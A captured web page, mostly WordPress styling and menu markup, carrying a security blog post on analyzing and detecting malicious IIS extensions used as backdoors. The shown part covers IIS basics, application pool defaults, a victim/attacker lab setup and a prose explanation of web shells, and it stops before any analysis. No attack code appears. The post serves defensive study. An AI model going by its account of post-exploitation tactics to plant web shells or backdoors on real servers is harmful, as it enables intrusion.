var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-base-color{color: var(--wp--preset--color--base) !important;}.has-contrast-color{color: var(--wp--preset--color--contrast) !important;}.has-accent-1-color{color: var(--wp--preset--color--accent-1) !important;}.has-accent-2-color{color: var(--wp--preset--color--accent-2) !important;}.has-accent-3-color{color: var(--wp--preset--color--accent-3) !important;}.has-accent-4-color{color: var(--wp--preset--color--accent-4) !important;}.has-accent-5-color{color: var(--wp--preset--color--accent-5) !important;}.has-accent-6-color{color: var(--wp--preset--color--accent-6) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-base-background-color{background-color: var(--wp--preset--color--base) !important;}.has-contrast-background-color{background-color: var(--wp--preset--color--contrast) !important;}.has-accent-1-background-color{background-color: var(--wp--preset--color--accent-1) !important;}.has-accent-2-background-color{background-color: var(--wp--preset--color--accent-2) !important;}.has-accent-3-background-color{background-color: var(--wp--preset--color--accent-3) !important;}.has-accent-4-background-color{background-color: var(--wp--preset--color--accent-4) !important;}.has-accent-5-background-color{background-color: var(--wp--preset--color--accent-5) !important;}.has-accent-6-background-color{background-color: var(--wp--preset--color--accent-6) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-base-border-color{border-color: var(--wp--preset--color--base) !important;}.has-contrast-border-color{border-color: var(--wp--preset--color--contrast) !important;}.has-accent-1-border-color{border-color: var(--wp--preset--color--accent-1) !important;}.has-accent-2-border-color{border-color: var(--wp--preset--color--accent-2) !important;}.has-accent-3-border-color{border-color: var(--wp--preset--color--accent-3) !important;}.has-accent-4-border-color{border-color: var(--wp--preset--color--accent-4) !important;}.has-accent-5-border-color{border-color: var(--wp--preset--color--accent-5) !important;}.has-accent-6-border-color{border-color: var(--wp--preset--color--accent-6) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}.has-xx-large-font-size{font-size: var(--wp--preset--font-size--xx-large) !important;}.has-manrope-font-family{font-family: var(--wp--preset--font-family--manrope) !important;}.has-fira-code-font-family{font-family: var(--wp--preset--font-family--fira-code) !important;}img.aligncenter{margin-left:auto;margin-right:auto;display:block;max-width:100%;height:auto;}
+
+th, td {
+  border-bottom: 1px solid #404040;
+padding: 5px;
+}
+
+strong {
+  font-weight: bold;
+}
+
+pre {
+  font-size: 18px;
+  background-color: #101010;
+  white-space: pre-wrap;
+  word-break: keep-all; 
+  border-radius: 8px;
+  padding: 1em;
+  color: #fff;
+  font-weight: normal;
+  font-family: "Source Code Pro", monospace;
+  text-rendering: optimizeLegibility;
+}
+
+h1 {
+  font-size: 2.5em;
+}
+
+h2 {
+  font-size: 2em;
+}
+h3 {
+  font-size: 1.75em;
+}
+
+h4 {
+  font-size: 1.5em;
+}
+
+h5 {
+  font-size: 1.25em;
+}
+
+h6 {
+  font-size: 1em;
+}
+:root :where(.wp-block-post-date){color: var(--wp--preset--color--accent-4);font-size: var(--wp--preset--font-size--small);}
+:root :where(.wp-block-post-date a:where(:not(.wp-element-button))){color: var(--wp--preset--color--accent-4);text-decoration: none;}
+:root :where(.wp-block-post-date a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
+:root :where(.wp-block-post-navigation-link){font-size: var(--wp--preset--font-size--medium);}
+:root :where(.wp-block-post-terms){font-size: var(--wp--preset--font-size--small);font-weight: 600;}:root :where(.wp-block-post-terms a){white-space: nowrap;}
+:root :where(.wp-block-post-title a:where(:not(.wp-element-button))){text-decoration: none;}
+:root :where(.wp-block-post-title a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
+:root :where(.wp-block-site-title){font-weight: 700;letter-spacing: -.5px;}
+:root :where(.wp-block-site-title a:where(:not(.wp-element-button))){text-decoration: none;}
+:root :where(.wp-block-site-title a:where(:not(.wp-element-button)):hover){text-decoration: underline;}
+:root :where(.wp-block-navigation){font-size: var(--wp--preset--font-size--medium);}
+:root :where(.wp-block-navigation a:where(:not(.wp-element-button))){text-decoration: none;}
+:root :where(.wp-block-navigation a:where(:not(.wp-element-button)):hover){text-decoration: underline;}</style>
+<style id="block-style-variation-styles-inline-css">:root :where(.is-style-post-terms-1--1 a:where(:not(.wp-element-button))){border-radius: 20px;border-color: var(--wp--preset--color--accent-6);border-width: 0.8px;border-style: solid;font-weight: 400;line-height: 2.8;padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;text-decoration: none;}:root :where(.is-style-post-terms-1--1 a:where(:not(.wp-element-button)):hover){text-decoration: underline;}</style>
+<style id="wp-emoji-styles-inline-css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<style id="core-block-supports-inline-css">.wp-container-core-navigation-is-layout-a89b3969{justify-content:center;}.wp-container-core-group-is-layout-4efaea1e{gap:0.2em;}.wp-container-core-post-content-is-layout-68124974 > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width:1440px;margin-left:auto !important;margin-right:auto !important;}.wp-container-core-post-content-is-layout-68124974 > .alignwide{max-width:1440px;}.wp-container-core-post-content-is-layout-68124974 .alignfull{max-width:none;}.wp-container-core-group-is-layout-9b36172e{flex-wrap:nowrap;justify-content:space-between;}.wp-container-core-group-is-layout-154222c2{flex-wrap:nowrap;justify-content:space-between;align-items:center;}.wp-container-core-post-template-is-layout-3ee800f6 > *{margin-block-start:0;margin-block-end:0;}.wp-container-core-post-template-is-layout-3ee800f6 > * + *{margin-block-start:0;margin-block-end:0;}.wp-container-content-b0223bd5{flex-basis:25%;}.wp-container-core-social-links-is-layout-ad1cd33a{flex-wrap:nowrap;gap:0 12px;justify-content:flex-end;}.wp-container-core-group-is-layout-cc97c919{flex-wrap:nowrap;gap:0;justify-content:space-between;}</style>
+<style id="wp-block-template-skip-link-inline-css">.skip-link.screen-reader-text {
+			border: 0;
+			clip-path: inset(50%);
+			height: 1px;
+			margin: -1px;
+			overflow: hidden;
+			padding: 0;
+			position: absolute !important;
+			width: 1px;
+			word-wrap: normal !important;
+		}
+
+		.skip-link.screen-reader-text:focus {
+			background-color: #eee;
+			clip-path: none;
+			color: #444;
+			display: block;
+			font-size: 1em;
+			height: auto;
+			left: 5px;
+			line-height: normal;
+			padding: 15px 23px 14px;
+			text-decoration: none;
+			top: 5px;
+			width: auto;
+			z-index: 100000;
+		}</style>
+<link rel="stylesheet" id="lbwps-styles-photoswipe5-main-css" href="/wp-content/plugins/lightbox-photoswipe/assets/ps5/styles/main.css?ver=5.7.3" media="all">
+<link rel="stylesheet" id="twentytwentyfive-style-css" href="/wp-content/themes/twentytwentyfive/style.css?ver=1.3" media="all">
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="alternate" title="JSON" type="application/json" href="/wp-json/wp/v2/posts/5452">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.8.3">
+<link rel="shortlink" href="/?p=5452">
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2F2022%2F11%2Fanalyzing-detecting-iis-backdoors%2F">
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2F2022%2F11%2Fanalyzing-detecting-iis-backdoors%2F&#038;format=xml">
+<script type="importmap" id="wp-importmap">
+{"imports":{"@wordpress\/interactivity":"\/wp-includes\/js\/dist\/script-modules\/interactivity\/index.min.js?ver=55aebb6e0a16726baffb"}}
+</script>
+<script type="module" src="/wp-includes/js/dist/script-modules/block-library/navigation/view.min.js?ver=61572d447d60c0aa5240" id="@wordpress/block-library/navigation/view-js-module"></script>
+<link rel="modulepreload" href="/wp-includes/js/dist/script-modules/interactivity/index.min.js?ver=55aebb6e0a16726baffb" id="@wordpress/interactivity-js-modulepreload">
+<style class="wp-fonts-local">@font-face{font-family:Manrope;font-style:normal;font-weight:200 800;font-display:fallback;src:url('/wp-content/themes/twentytwentyfive/assets/fonts/manrope/Manrope-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:"Fira Code";font-style:normal;font-weight:300 700;font-display:fallback;src:url('/wp-content/themes/twentytwentyfive/assets/fonts/fira-code/FiraCode-VariableFont_wght.woff2') format('woff2');}</style>
+</head>
+
+<body class="wp-singular post-template-default single single-post postid-5452 single-format-standard wp-embed-responsive wp-theme-twentytwentyfive">
+
+<div class="wp-site-blocks">
+<header class="wp-block-template-part">
+<div class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
+<div class="wp-block-group alignwide has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--30)">
+<p class="has-text-align-center alignwide wp-block-site-title has-x-large-font-size"><a href="/" target="_self" rel="home">RobWillis.info</a></p>
+
+
+<div class="wp-block-group alignwide has-global-padding is-layout-constrained wp-block-group-is-layout-constrained"><nav class="items-justified-center wp-block-navigation is-content-justification-center is-layout-flex wp-container-core-navigation-is-layout-a89b3969 wp-block-navigation-is-layout-flex" aria-label="Menu"><ul class="wp-block-navigation__container items-justified-center wp-block-navigation">
+<li class=" wp-block-navigation-item  menu-item menu-item-type-custom menu-item-object-custom menu-item-home wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/" title=""><span class="wp-block-navigation-item__label">Home</span></a></li>
+<li data-wp-context="{ &quot;submenuOpenedBy&quot;: { &quot;click&quot;: false, &quot;hover&quot;: false, &quot;focus&quot;: false }, &quot;type&quot;: &quot;submenu&quot;, &quot;modal&quot;: null }" data-wp-interactive="core/navigation" data-wp-on--focusout="actions.handleMenuFocusout" data-wp-on--keydown="actions.handleMenuKeydown" data-wp-on-async--mouseenter="actions.openMenuOnHover" data-wp-on-async--mouseleave="actions.closeMenuOnHover" data-wp-watch="callbacks.initMenu" tabindex="-1" class="wp-block-navigation-item has-child open-on-hover-click  menu-item menu-item-type-custom menu-item-object-custom wp-block-navigation-submenu">
+<a class="wp-block-navigation-item__content" href="#" title=""><span class="wp-block-navigation-item__label">Categories</span></a><button data-wp-bind--aria-expanded="state.isMenuOpen" data-wp-on-async--click="actions.toggleMenuOnClick" aria-label="Categories submenu" class="wp-block-navigation__submenu-icon wp-block-navigation-submenu__toggle"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewbox="0 0 12 12" fill="none" aria-hidden="true" focusable="false"><path d="M1.50002 4L6.00002 8L10.5 4" stroke-width="1.5"></path></svg></button><ul data-wp-on-async--focus="actions.openMenuOnFocus" class="wp-block-navigation__submenu-container has-text-color has-contrast-color has-background has-base-background-color  menu-item menu-item-type-custom menu-item-object-custom wp-block-navigation-submenu">
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/servers/" title=""><span class="wp-block-navigation-item__label">Servers &#8211; Win, *nix, ESXi</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/security/" title=""><span class="wp-block-navigation-item__label">Security</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/pen-testing/" title=""><span class="wp-block-navigation-item__label">Pen Testing</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/scripting/" title=""><span class="wp-block-navigation-item__label">PowerShell/Scripting</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/computers/" title=""><span class="wp-block-navigation-item__label">Computers</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/android-hacks/" title=""><span class="wp-block-navigation-item__label">Android Hacks</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/software/" title=""><span class="wp-block-navigation-item__label">Software</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/gaming/" title=""><span class="wp-block-navigation-item__label">Gaming &#8211; PC/PS3/Xbox 360</span></a></li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-taxonomy menu-item-object-category wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/category/air-guns/" title=""><span class="wp-block-navigation-item__label">Air Guns</span></a></li>
+</ul>
+</li>
+<li class=" wp-block-navigation-item  menu-item menu-item-type-post_type menu-item-object-page wp-block-navigation-link"><a class="wp-block-navigation-item__content" href="/about/" title=""><span class="wp-block-navigation-item__label">About</span></a></li>
+</ul></nav></div>
+</div>
+</div>
+</header>
+
+
+<main class="wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="margin-top:var(--wp--preset--spacing--60)">
+<div class="wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained" style="padding-top:var(--wp--preset--spacing--60);padding-bottom:var(--wp--preset--spacing--60)">
+<h1 class="wp-block-post-title">Analyzing &#038; Detecting IIS Backdoors</h1>
+
+
+<div class="wp-block-group has-link-color has-accent-4-color has-text-color has-small-font-size is-layout-flex wp-container-core-group-is-layout-4efaea1e wp-block-group-is-layout-flex" style="margin-bottom:var(--wp--preset--spacing--60)">
+<p>Written by </p>
+
+
+<div class="wp-block-post-author-name"><a href="/author/bit_rot/" target="_self" class="wp-block-post-author-name__link">robwillisinfo</a></div>
+
+
+<p>in</p>
+
+
+<div style="font-weight:300" class="taxonomy-category wp-block-post-terms">
+<a href="/category/blog/" rel="tag">Blog</a><span class="wp-block-post-terms__separator">, </span><a href="/category/computers/" rel="tag">Computers</a><span class="wp-block-post-terms__separator">, </span><a href="/category/pen-testing/" rel="tag">Pen Testing</a><span class="wp-block-post-terms__separator">, </span><a href="/category/security/" rel="tag">Security</a><span class="wp-block-post-terms__separator">, </span><a href="/category/servers/" rel="tag">Servers</a><span class="wp-block-post-terms__separator">, </span><a href="/category/tools/" rel="tag">Tools</a>
+</div>
+</div>
+
+
+<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-container-core-post-content-is-layout-68124974 wp-block-post-content-is-layout-constrained">
+<p><a href="/wp-content/uploads/2022/10/IIS-Raid-Feat.png" data-lbwps-width="950" data-lbwps-height="441" data-lbwps-srcsmall="/wp-content/uploads/2022/10/IIS-Raid-Feat-500x232.png"><img fetchpriority="high" decoding="async" src="/wp-content/uploads/2022/10/IIS-Raid-Feat-500x232.png" alt="" width="500" height="232" class="aligncenter size-medium wp-image-5694" srcset="/wp-content/uploads/2022/10/IIS-Raid-Feat-500x232.png 500w, /wp-content/uploads/2022/10/IIS-Raid-Feat-768x357.png 768w, /wp-content/uploads/2022/10/IIS-Raid-Feat.png 950w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
+<h3>IIS Extensions As Backdoors</h3>
+<p>Microsoft recently published an interesting blog explaining how they&#8217;ve noticed a new trend where attackers have been leveraging Internet Information Services (IIS) extensions to covertly backdoor Windows servers:<br>
+<a href="https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/" target="_blank" rel="noopener"><strong>https://www.microsoft.com/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/</strong></a></p>
+<p>The Microsoft post contains a wealth of information on this topic, but I really wanted to dig through the specifics in order to understand what it takes to build an IIS extension, deploy it, and then ultimately see how it executes on a system as it is interacted with.</p>
+<p>I&#8217;ve always been a huge fan of IIS (7+) and I thought this would be an interesting opportunity to revisit IIS from a more offensive/defensive perspective. I have also noticed that while IIS can be incredibly prevalent in Windows environments, it is often markedly less understood than the open source web server variants like Apache and Nginx. With this in mind, my intention for this post is to cover a little bit about IIS and some of its nuances, demonstrate what malicious IIS extension activity looks like, and hopefully come up with some ideas and log examples to help narrow in on this sort of activity at scale.</p>
+<h3>What Is IIS?</h3>
+<p>Internet Information Services (IIS) is Microsoft&#8217;s web server platform. With  IIS being a generic web server capable of hosting ASP.NET applications, Microsoft also uses IIS to host the web front end components for some their own services like Outlook Web Access (OWA) and Remote Desktop Web Access (RDWeb). So even if an environment is not explicitly hosting sites on IIS, keep in mind that there is a chance that IIS is present in some sort of supporting role.</p>
+<h4>IIS Vulnerabilities &#038; Exploitation</h4>
+<p>While IIS can and has had its share of vulnerabilities, the web server itself is relatively mature and vulnerabilities are very rare today.</p>
+<p>As explained in the Microsoft post, IIS backdoors are typically deployed in the post exploitation phase. This means that the server has already been compromised by some other means, with the most likely scenario being a vulnerability in the web application that is being hosted by IIS.</p>
+<h4>IIS Server Features &#038; Application Pool Settings</h4>
+<p>There are a few features and settings that I want to highlight really quickly that are worth being aware of when it comes to abusing/investigating IIS servers and application pools/worker processes.</p>
+<p>The first item is a feature of IIS and web servers in general, host headers. Host headers allow a web server to host multiple web sites behind single IP address. How does the IIS server know to serve up the correct site? The request has to come in with a &#8220;host&#8221; header (usually the domain) that matches the binding set in IIS:</p>
+<p><a href="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit.png" data-lbwps-width="1918" data-lbwps-height="690" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit-500x180.png"><img decoding="async" src="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit-500x180.png" alt="" width="500" height="180" class="aligncenter size-medium wp-image-5652" srcset="/wp-content/uploads/2022/09/IIS-Host-Headers-Edit-500x180.png 500w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit-1024x368.png 1024w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit-768x276.png 768w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit-1536x553.png 1536w, /wp-content/uploads/2022/09/IIS-Host-Headers-Edit.png 1918w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
+<p>If investigating traffic to a server purely based off of IP address, this behavior can mix in additional/unrelated traffic. Wireshark filters like &#8220;http.host&#8221; can be used to help ensure only traffic to the specific domain is included.</p>
+<p>Another design feature to point out is that a single IIS server can support thousands of sites and each site will have at least one IIS worker process (w3wp.exe). This means that there can be <em><strong>many</strong></em> instances of w3wp.exe running on a single host, and it can be a little tricky to hone in on the right one. Process IDs and user IDs (assuming they are descriptive) can useful here, the IIS Manager also provides some useful information:</p>
+<p><a href="/wp-content/uploads/2022/10/IIS-w3wps-1.png" data-lbwps-width="1506" data-lbwps-height="946" data-lbwps-srcsmall="/wp-content/uploads/2022/10/IIS-w3wps-1-500x314.png"><img decoding="async" src="/wp-content/uploads/2022/10/IIS-w3wps-1-500x314.png" alt="" width="500" height="314" class="aligncenter size-medium wp-image-5667" srcset="/wp-content/uploads/2022/10/IIS-w3wps-1-500x314.png 500w, /wp-content/uploads/2022/10/IIS-w3wps-1-1024x643.png 1024w, /wp-content/uploads/2022/10/IIS-w3wps-1-768x482.png 768w, /wp-content/uploads/2022/10/IIS-w3wps-1.png 1506w" sizes="(max-width: 500px) 100vw, 500px"></a></p>
+<p><strong>Application Pool Settings</strong></p>
+<p><a href="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set.png" data-lbwps-width="1920" data-lbwps-height="1040" data-lbwps-srcsmall="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-500x271.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-500x271.png" alt="" width="500" height="271" class="aligncenter size-medium wp-image-5645" srcset="/wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-500x271.png 500w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-1024x555.png 1024w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-768x416.png 768w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set-1536x832.png 1536w, /wp-content/uploads/2022/09/IIS-ApplicationPool-Adv-Set.png 1920w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>The table below has a few of the more notable default application pool settings:</p>
+<table>
+<tr>
+<td><strong>Setting</strong></td>
+<td><strong>Default Value</strong></td>
+<td><strong>Notes</strong></td>
+</tr>
+<tr>
+<td>Start Mode</td>
+<td>OnDemand</td>
+<td>The worker process (w3wp.exe) will not start until a request is made.</td>
+</tr>
+<tr>
+<td>Idle Time-out (minutes)</td>
+<td>20</td>
+<td>After 20 minutes with no requests, the worker process (w3wp.exe) will terminate.</td>
+</tr>
+<tr>
+<td>Idle Time-out Action</td>
+<td>Terminate</td>
+<td>The worker process (w3wp.exe) will terminate once the time-out has been reached.</td>
+</tr>
+<tr>
+<td>Maximum Worker Processes</td>
+<td>1</td>
+<td>A single site can have more than one worker process (w3wp.exe) running (aka Web garden).</td>
+</tr>
+<tr>
+<td>Rapid-Fail Protection</td>
+<td>5 failures within 5 minutes</td>
+<td>If you run bad enough code to crash the worker process within the threshold, IIS will stop the site, requiring administrative intervention.</td>
+</tr>
+<tr>
+<td>Recycling &#8211; Regular Time Interval (minutes)</td>
+<td>1740 (29 hours)</td>
+<td>When this limit is reached, a new w3wp.exe process will be spawned (new PID) and the old one will be terminated once it has finished processing all active requests.</td>
+</tr>
+</table>
+<h3>Lab Setup</h3>
+<p>The lab setup for this post is going to consist of two virtual machines, a fully up to date Windows Server 2019 (victim) and a Kali Linux host (attacker). These hosts are on the same network and DNS records have been configured for each host to make it a little easier to differentiate between the hosts themselves and to help distinguish between internal and external connections:</p>
+<table>
+<tr>
+<td><strong>Host</strong></td>
+<td><strong>DNS</strong></td>
+<td><strong>IP</strong></td>
+</tr>
+<tr>
+<td>Windows Server &#8211; VMW-L-IIS01</td>
+<td>iis.robwillis.info</td>
+<td>192.168.90.216</td>
+</tr>
+<tr>
+<td>Kali &#8211; iPhone-X</td>
+<td>kali.external-threat.net</td>
+<td>192.168.90.214</td>
+</tr>
+</table>
+<p>IIS with ASP.NET support was installed on the Windows server using the following command:</p>
+<pre>
+PS > Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole, IIS-WebServer, IIS-CommonHttpFeatures, IIS-Security, IIS-RequestFiltering, IIS-StaticContent, IIS-DefaultDocument, IIS-DirectoryBrowsing, IIS-HttpErrors, IIS-HttpRedirect, IIS-HealthAndDiagnostics, IIS-HttpLogging, IIS-Performance, IIS-HttpCompressionStatic, IIS-HttpCompressionDynamic, IIS-WebServerManagementTools, IIS-ManagementConsole, IIS-NetFxExtensibility45, IIS-ISAPIExtensions, IIS-ISAPIFilter, IIS-ASPNET45
+</pre>
+<p>And a basic website (iis.robwillis.info) has been configured:<br>
+<a href="/wp-content/uploads/2022/09/Get-IISSite.png" data-lbwps-width="863" data-lbwps-height="226" data-lbwps-srcsmall="/wp-content/uploads/2022/09/Get-IISSite-500x131.png"><img loading="lazy" decoding="async" src="/wp-content/uploads/2022/09/Get-IISSite-500x131.png" alt="" width="500" height="131" class="aligncenter size-medium wp-image-5471" srcset="/wp-content/uploads/2022/09/Get-IISSite-500x131.png 500w, /wp-content/uploads/2022/09/Get-IISSite-768x201.png 768w, /wp-content/uploads/2022/09/Get-IISSite.png 863w" sizes="auto, (max-width: 500px) 100vw, 500px"></a></p>
+<p>For time sake, I am not going to cover web application vulnerabilities or initial access. The testing in this post will start with the Windows server/IIS site in an &#8220;assumed compromised&#8221; state, meaning a web shell has already been staged on the server.</p>
+<p>For analysis and detection, I will mainly be relying on the following logs and tools:</p>
+<ul>
+<li>Windows OS Logs</li>
+<li>IIS Logs</li>
+<li>SysInternals Sysmon (since the data should be very similar to most Endpoint Detection &#038; Response (EDR) tooling)</li>
+<li>Visual Studio Community (Compiling/Debugging)</li>
+<li>Wireshark (Packet Capture)</li>
+</ul>
+<p>I want to keep the logging/tooling set as light as possible to emulate the basic data set that should (hopefully) be available to a defender when investigating a potential incident. Keeping it real, while trying to do more with less.</p>
+<h3>Web Shells vs IIS Extensions</h3>
+<h4>Web Shells</h4>
+<p>In a blog post from last year, Microsoft mentioned how they noticed incidents involving web shells were also on the rise:<br>
+<a href="https://www.microsoft.com/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/" target="_blank" rel="noopener"><strong>https://www.microsoft.com/security/blog/2021/02/11/web-shell-attacks-continue-to-rise/</strong></a></p>
+<p>Web shells are important to note when it comes to IIS extension activity because attackers will typically leverage a web shell to install additional malware, like an IIS extension/backdoor. So before jumping into IIS extensions, I want to talk a little bit about what exactly a web shell is and demonstrate what it looks like moving from a web shell to an IIS extension/backdoor.</p>
+<p>A web shell is usually a small piece of software (often a single file) written in a language used for web development (ASP.NET, PHP, JSP), that when uploaded to a web servers root directory, provides an attacker with remote access/code execution. Web shells do not need to be compiled, can be edited in a normal text editor and come in a variety of extensions (.asp, .aspx, .php, .jsp, etc).</p>
+<p>The following conditions must be met for an attacker to be able to successfully upload and execute a web shell on a server:</p>
+<ul>
+<li>
+<strong>Remote Code Execution</strong> &#8211; Attacker has already achieved RCE via a vulnerability in the server or web application, and can now run commands to download or load files from remote sources.</li>
+<li>
+<strong>Write Access</strong> &#8211; By default IIS identities have minimal write access to the file system, however dynamic applications will often require write access to portions of the webroot and temporary directories.</li>
+<li>
+<strong>Server Side Support</strong> &#8211; The server must support some sort of web technology (IIS servers typically support ASP/ASP.NET). If an attacker attempts to use a web shell written in a technology that the server does not support, the web shell will not execute.</li>
+</ul>
